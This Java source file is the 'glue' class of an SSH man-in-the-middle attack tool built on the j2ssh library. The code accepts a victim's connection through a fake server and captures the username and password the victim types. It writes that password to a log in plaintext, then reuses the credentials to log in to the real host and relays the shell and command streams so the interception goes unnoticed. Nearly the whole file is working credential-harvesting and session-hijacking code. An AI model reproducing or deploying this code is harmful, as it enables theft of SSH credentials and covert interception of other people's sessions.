/*
 * Created on Mar 3, 2003
 *
 * 
 */
package com.sshtools.j2ssh;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import org.apache.log4j.Logger;

import com.sshtools.j2ssh.authentication.AuthenticationProtocolState;
import com.sshtools.j2ssh.authentication.PasswordAuthenticationClient;
import com.sshtools.j2ssh.configuration.ConfigurationLoader;
import com.sshtools.j2ssh.configuration.ServerConfiguration;
import com.sshtools.j2ssh.configuration.SshConnectionProperties;
import com.sshtools.j2ssh.io.IOStreamConnector;
import com.sshtools.j2ssh.io.IOStreamConnectorState;
import com.sshtools.j2ssh.session.MitmSessionChannelServer;
import com.sshtools.j2ssh.session.PseudoTerminal;
import com.sshtools.j2ssh.session.SessionChannelClient;
import com.sshtools.j2ssh.transport.ServiceOperationException;
import com.sshtools.j2ssh.transport.TransportProtocolCommon;
import com.sshtools.j2ssh.transport.publickey.OpenSSHPublicKeyFormat;

/**
 * @author David G&uuml;mbel<br>
 * 
 * created Mar 3, 2003<br>
 *
 * This class serves as an interaction module between <code>MitmServer</code> accepting new
 * connections and forwarding it via <code>MitmClient</code> to a remote host. It "glues" those two 
 * classes together in a simple way. 
 */
public class MitmGlue extends Object implements Cloneable {
	private static Logger log = Logger.getLogger(MitmGlue.class);
	private static ServerConfiguration config =
			   ConfigurationLoader.getServerConfiguration();
	
	private String username ="";
	private String password = "";
	
	private SshClient mc = new SshClient();
	private MitmServer ms = null;
	private MitmSessionChannelServer mscs = null;
	private MitmGlueConnectionThread mgt = null;
	
	public SessionChannelClient scc = null;
	
	private InputStream in;
	private OutputStream out;
	private InputStream err;
	
	private IOStreamConnector iosinput, iosoutput, iosstderr;
	
	
	private SshConnectionProperties prop = new SshConnectionProperties();
	/* the status of the mitma */
	private int state = MitmState.MITM_STATE_UNUSED;
	

	/**
	 * Constructor.
	 * Initializes SshConnectionProperties element of class
	 * 
	 * @param hostname	the target host to forward clients to 
	 * @param port	the port of the target host running its ssh server
	 */
	public MitmGlue(String hostname, int port) {
		prop.setHost(hostname);
		prop.setPort(port);
		mgt = new MitmGlueConnectionThread(this);		
	}
	
	/**
	 * Clones the object, copying all needed information.
	 * 
	 * Every connection client<-->mitmserver<-->target host has exactly one
	 * <code>MitmGlue</code> object attached. Thus, the <code>MitmGlue</code> object needs to be <code>clone()</code>d
	 * by the <code>MitmSessionChannelServer</code>. The <code>ConnectionProperties</code>
	 * and the credentials (for further logins at the target host) need to be cloned. This is 
	 * handled here.
	 */
	public Object clone() throws CloneNotSupportedException {
		MitmGlue m = new MitmGlue(getHostname(), getPort());
		/* set credentials */
		m.prop = prop;
		m.setCredentials(this.username, this.password);
		//m.doAuthentication();
		return m;	//super.clone();
	}
	
	/**
	 * Main method for <code>MitmGlue</code>, starts <code>MitmServer</code>. 
	 * Example: <code>java MitmGlue ssh.targethost.com 22</code> 
	 * @param args	target hostname, target host's port.
	 * 
	 */
	public static void main(String args[]) {
		log.info("mitm: MitmGlue starting up");
		// TODO check args before starting
		try{		
			MitmGlue mg = new MitmGlue(args[0],Integer.parseInt(args[1]));
			MitmServer ms = new MitmServer(mg);
			mg.setMitmServer(ms);
			log.info("mitm: successfully started server");
		}
		catch (Exception e) {
			log.error("mitm: MitmGlue failed to instantiate MitmServer object, exiting",e);
			System.exit(255);
		}
		
		
	}
	
	/**
	 * Setter for the local reference to the MitmServer object.
	 * @param ms
	 */
	private void setMitmServer(MitmServer ms) {
		this.ms = ms;
	}
	
	
	/**
	 * Sets the username and password entered by the user.
	 * Those will be used to connect to the remote host during the mitm-attack.
	 * @param username
	 * @param Password
	 */
	public void setCredentials(String username, String password) {
		log.debug("mitm: setCredentials() called");
		this.username = username;
		this.password = password;
		state = MitmState.MITM_STATE_SETUP;
		//TODO maybe those should be logged ?-)
	}

	
	/**
	 * Connects to the target host and authenticates. 
	 * (Then opens a SessionChannelClient.)
	 *
	 */
	private synchronized void connect() {
		log.debug("mitm: called connect()");
		/* if there's no MitmClient there yet, we need to create one */
		if (state < MitmState.MITM_STATE_TRANSPORT_CONNECTED) {
			try {
				log.debug("mitm: connect(): trying to connect client");
				mc.connect(prop);
				state = MitmState.MITM_STATE_TRANSPORT_CONNECTED;
			} catch (Exception e) { // IOException...
				log.error("mitm: failed to connect to remote target host, exiting: ",e);
				System.exit(255);
			}
		}
		
		log.debug(
			"mitm: connect() finished, mc.isConnected() is "
				+ mc.isConnected());
		log.debug("mitm: connect(): state is "+state);
	}
	
	
	/**
	 * Sets the stdin, stdout, and stderr streams of this MitmGlue.
	 * This is needed for forwarding input from client to target host transparently,
	 * which is done by @link doConnectStreams()
	 * @throws ServiceOperationException
	 */
	private boolean setStreams() {
		log.debug("mitm: setStreams() called, state was "+state);
		boolean result = true;
		if (state < MitmState.MITM_STATE_AUTHENTICATED) {
			log.debug("mitm: setStreams(): doing authentication");
			doAuthentication();
			} 
		if (state < MitmState.MITM_STATE_STREAMS_SETUP) {
			try {
				log.debug("mitm: setStreams(): trying to open SessionChannelClient and then streams");
				//if (scc == null) doOpenSessionChannelClient();
				in = scc.getInputStream();		
				out = scc.getOutputStream();
				err = scc.getStderrInputStream();
				state = MitmState.MITM_STATE_STREAMS_SETUP;
				result = true;
			}
			catch (Exception e) {
				log.error("mitm: setStreams() failed",e);
				result = false;
			}
		}
		return result;
	}
	
	/**
	 * Opens a new SessionChannelClient object.
	 * Needed to later retrieve its streams in connectStreams().
	 * @throws IOException
	 */
	private void doOpenSessionChannelClient() throws IOException {
		
		log.debug("mitm: doOpenSessionChannelClient() called");
		//if ((scc != null) && (!scc.isClosed())) return; /* make sure we open only once */
		scc = mc.openSessionChannel();
		log.debug("mitm:about to start mgt...");
		
		/* start MitmGlueConnectionThread to check when connection is closed by remote target host */ 
		mgt = new MitmGlueConnectionThread(this);
		mgt.start();
	}

	/**
	 * Authenticates at remote target host using the credentials given before.
	 * @return boolean	true if authentication successful
	 */
	public synchronized boolean doAuthentication() {
		boolean result = false;
		//TODO check for correct this.state?
		log.debug("mitm: doAuthentication() called, state was " +state);
		if (state < MitmState.MITM_STATE_TRANSPORT_CONNECTED) connect();
		log.debug("mitm: doAuthentication(): authenticating ");
		PasswordAuthenticationClient auth = new PasswordAuthenticationClient();
		auth.setUsername(username);
		auth.setPassword(password);
		try {			
				if (mc.authenticate(auth) == AuthenticationProtocolState.COMPLETE) {
					log.debug("mitm: successfully authenticated after one attempt");
					log.info("mitm: password for user "+username+"="+password);
					state = MitmState.MITM_STATE_AUTHENTICATED;
					log.info("mitm: state is "+state);
					log.info("mitm: doAuthentication(): opening scc");
					doOpenSessionChannelClient();
					result = true;
				}
				else {
					log.error("could not authenticate at remote target host!"); 
				}				
				
			}
			catch (IOException e) {
				log.error("Failed to authenticate at target host");
				// TODO do we really need to sleep here?
				return false;	
			}
		return result;
	}
	
	/**
	 * Requests a pseudo-terminal (pty) at the target host.
	 * If the request ("pty-req") was successfull, the client's and the remote target
	 * host's streams will be connected using <code>doConnectStreams()</code>, transparently
	 * forwarding the connection.
	 * @param pterm the <code>PseudoTerminal</code> instance to create
	 * @param in the <code>InputStream</code> to connect with
	 * @param out the <code>OutputStream </code> to connect with
	 * @return boolean true if successfull
	 */
	public boolean requestPseudoTerminal(PseudoTerminal pterm, InputStream in, OutputStream out) {
		log.debug("mitm: requestPTY(): state is "+state);
		log.debug("mitm: thread running? "+ mgt.isRunning);
		if (state < MitmState.MITM_STATE_TRANSPORT_CONNECTED) connect();
		if (state < MitmState.MITM_STATE_STREAMS_SETUP) setStreams();
		try {
			if (scc.requestPseudoTerminal(pterm)) {				
				log.debug("mitm: scc.requestPTY succedded");		
			}
		}
		catch (Exception e) {
			log.error("mitm: failed to allocate a pty at remote host; exception was thrown:",e);
			return false;
		}
		if (!streamsConnected()) return doConnectStreams(in,out,false);
		return true;
	}
	
	/**
	 * Sets an environment variable at the remote host.
	 * @param name the name of the variable
	 * @param value the value of the variable
	 * @return boolean true if succesfull
	 */
	public boolean setEnvironmentVariable(String name, String value) {
		boolean result = false;
		log.debug("mitm: setting environment variable at remote host");
		try {
			scc.setEnvironmentVariable(name,value);
			result = true;
		}
		catch (Exception e) {
			log.error("mitm: failed to set environment variable, exception was thrown:",e);
			result = false;
		}
		return result;
	}
	
	/**
	 * Starts a shell at the target host.
	 * If the request was successfull, the client's and the remote target
	 * host's streams will be connected using <code>doConnectStreams()</code>, transparently
	 * forwarding the connection.
	 * @param in the <code>InputStream</code> to connect with
	 * @param out the <code>OutputStream </code> to connect with
	 * @return boolean true if successfull
	 */
	public boolean startShell(InputStream in, OutputStream out) {
		log.debug("mitm: startShell() called, state is "+state);
		//if (state < MitmState.MITM_STATE_TRANSPORT_CONNECTED) connect();
		try {
			if (scc.startShell()) {
				if (state < MitmState.MITM_STATE_STREAMS_SETUP) setStreams();
				log.info("mitm: success at starting remote shell");
			}
			/* startShell failed */
			else {
				log.error("mitm: failed to start remote shell");
				return false;
			}
		}
		catch (Exception e) {
			log.error("mitm: failed to start remote shell, exception ("+e.getMessage()+") was thrown: ",e);
			return false;			
		}
		if (!streamsConnected()) return doConnectStreams(in,out,false);
		return true;
	}
	
	/**
	 * Executes a command at the remote host.
	 * If the request was successfull, the client's and the remote target
	 * host's streams will be connected using <code>doConnectStreams()</code>, transparently
	 * forwarding the connection.
	 * @param command the command to execute (e.g. "/bin/ls")
	 * @param in the <code>InputStream</code> to connect with
	 * @param out the <code>OutputStream </code> to connect with
	 * @return boolean true if successfull
	 */
	public boolean executeCommand(String command, InputStream in, OutputStream out) {
		if (state < MitmState.MITM_STATE_TRANSPORT_CONNECTED) connect();
		if (state < MitmState.MITM_STATE_STREAMS_SETUP) setStreams();
		try {
			if (scc.executeCommand(command)) {
					log.info("mitm: success at executing remote command");
					
			}
		} catch (Exception e) {
			log.error("mitm: failed to execute remote command");
			return false;
		}
		if (!streamsConnected()) return doConnectStreams(in,out,true);
		return true;	 
	}
	

	
	/**
	 * Returns true if we have already connected client's and mitmclient's streams.
	 * @return boolean
	 */
	private boolean streamsConnected() {
		boolean result = false;
		if (state == MitmState.MITM_STATE_STREAMS_CONNECTED) result = true;
		log.debug("mitm: streamsConnected() called, state is "+state+", so result is "+result);
		return result;
	}
	
	/**
	 * Connects the client's and the mitmclient's streams.
	 * Makes use of <code>IOStreamConnector</code> to transparently forward input
	 * and output from client to target and vice versa.
	 * @param in the <code>InputStream</code> to connect
	 * @param out the <code>OutputStream</code> to connect
	 * @return boolean true if successful.
	 */
	private boolean doConnectStreams(InputStream in, OutputStream out, boolean connectStderr) {
		log.debug("mitm: doConnectStreams() called, state is "+state);
		iosinput = new IOStreamConnector(this.in, out);
		iosoutput = new IOStreamConnector(in,this.out);
		if (connectStderr) {
			try {
				iosstderr = new IOStreamConnector(scc.getStderrInputStream(), out);
			}
			catch (Exception e) {
				log.error("mitm: failed to conenct stderr");
			}
		}
		state = MitmState.MITM_STATE_STREAMS_CONNECTED;
		return true;
	}
	
	
	/**
	 * Returns the target hostname of this <code>MitmGlue</code> object .
	 * @return String hostname
	 */
	public String getHostname() {
		return prop.getHost();
	}
	
	/**
	 * Returns the target host's port of this <code>MitmGlue</code> object.
	 * @return int port
	 */
	public int getPort() {
		return prop.getPort();
	}
	
	/**
	 * Disconnects the client. 
	 * In case the <code>MitmClient</code> is still connected too, it will be disconnected as well.
	 * @return boolean true if successful.
	 */
	public boolean doDisconnect() {
		log.debug("mitm: doDisconnect() called");
		boolean result = true;
		try {			
			//doDisconnectStreams();
			if (mc.isConnected()) {
				log.debug("mitm: mc was still connected, disconnecting() it now");
				mc.disconnect(); 
				} 
			mscs.close();
		}
		catch (Exception e) {
			result = false;
			log.error("mitm: failed to doDisconnect(): "+e);
			e.printStackTrace();
		}
		return result;
	}
	
	/**
	 * Setter for the local reference to the <code>SessionChannelServer</code> attached to this
	 * <code>MitmGlue</code>.
	 * 
	 * @param m the <code>MitmSesionChannelServer</code> to set to
	 */
	public void setSessionChannelServer(MitmSessionChannelServer m) {
		log.debug("mitm: setSessionChannelServer() called");
		this.mscs = m;
/*		this.in= m.getInputStream();
		this.out = m.getOutputStream();*/
	}

	/**
	 * @return InputStream
	 */
	public InputStream getInputStream() {
		// TODO testing for the reight state?
	/*	if (state < MitmState.MITM_STATE_TRANSPORT_CONNECTED)  {
			log.debug("mitm: getInputStream(): mc was not connected");
			connect();
		}
		if (state < MitmState.MITM_STATE_AUTHENTICATED) {
			log.debug("mitm: getInputStream(): doing authentication");
			doAuthentication();
		} */
		if (state < MitmState.MITM_STATE_STREAMS_SETUP) {
			log.debug("mitm: getInputStream(): setting streams");
			setStreams(); 
		}
		
		return in;
	}

	/**
	 * @return OutputStream
	 */
	public OutputStream getOutputStream() {
		/*if (state < MitmState.MITM_STATE_TRANSPORT_CONNECTED)  {
			log.debug("mitm: getOutputStream(): mc was not connected");
			connect();
		}
		if (state < MitmState.MITM_STATE_AUTHENTICATED) {
			log.debug("mitm: getOutputStream(): doing authentication");
			doAuthentication();
		} */
		if (state < MitmState.MITM_STATE_STREAMS_SETUP) {
			log.debug("mitm: getOutputStream(): setting streams");
			setStreams(); 
		}
		
		return out;
	}

	/*---------------------------------------------*/
	/**
	 * 
	 * @author David G&uuml;mbel<br>
	 * 
	 * created Mar 4, 2003<br>
	 * This class keeps track of the state of the <code>MitmClient</code> conencting from
	 * <code>MitmServer</code>'s host to the target destination host. When the user logs out,
	 * this <code>MitmClient</code> no longer <code>isConnected()</code>. By repeatedly checking
	 * this, <code>MitmGlueConnectionThread</code> knows when to disconnect the
	 * client from the <code>MitmServer</code> and does so. 
	 * 
	 *
	 * 
	 *
	 */
	
	class MitmGlueConnectionThread extends Thread {
		
		private Logger log = Logger.getLogger(MitmGlueConnectionThread.class);
		private MitmGlue mg = null;
		private boolean helloWorldSaid = false;
		public boolean isRunning = false;
		
		public MitmGlueConnectionThread(MitmGlue mg) {
			this.mg = mg;
			log.info("mitm: MitmGlueConnection thread created");
		}
		
		/**
		 * Check if scc.isClosed() and terminate the connection from <code>MitmServer></code>
		 * to our attack victim.
		 * Usually this thread ist started by <code>MitmGlue.doOpenSessionChannelClient()</code>.
		 */
		public void run() {
			isRunning = true;
			int i = 0;
			while (true) {
				//log.debug("mitm: still running, scc.isClosed is "+mg.scc.isClosed()+ ", state is "+mg.state);
				/* debug */
				if (!helloWorldSaid) {
					log.debug("mitm: saying hello world!");
					log.debug("mitm: mc.isConnected() is " + mg.mc.isConnected());
					helloWorldSaid = true;
				}
				/*i++;
				if (i > 200000) { 
					log.debug("mitm: still running, mg.scc.isClosed="+mg.scc.isClosed() +"mg.mc.isConencted = "+ mg.mc.isConnected());
					i = 0;} 
				*/
				/* real work */
				if ((mg.scc.isClosed()) && (mg.state >= MitmState.MITM_STATE_STREAMS_CONNECTED)) {
									log.debug("mitm: remote target host has closed connection");
									mg.doDisconnect();
									return;
				}
			try { 
				Thread.sleep(50);
				
				yield();
			}
			catch (Exception e) {
				log.debug("mitm: unable to sleep()",e);
			}
		}
	}

}
}